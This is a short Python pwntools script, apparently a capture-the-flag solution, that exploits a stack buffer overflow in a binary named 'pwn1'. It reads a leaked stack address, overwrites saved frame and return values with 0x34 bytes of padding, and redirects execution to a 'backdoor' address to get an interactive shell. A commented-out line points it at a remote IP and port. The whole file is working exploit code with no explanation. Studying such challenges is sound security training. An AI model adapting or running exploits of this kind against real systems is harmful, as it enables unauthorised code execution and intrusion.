#coding:utf8
from pwn import *
backdoor = 0x08048540
# sh= remote('113.201.14.253',16088)
sh = process('./pwn1')
dbg = lambda text=None  : gdb.attach(sh, text)
context.terminal = ["/bin/tmux", "sp",'-h']
sh.recvuntil('Gift:')
stack_addr = int(sh.recvuntil('\n',drop = True),16)
payload = 'a'*0x34 + p32(stack_addr + 0x3c) + p32(backdoor)

dbg()
sh.sendline(payload)

sh.interactive()
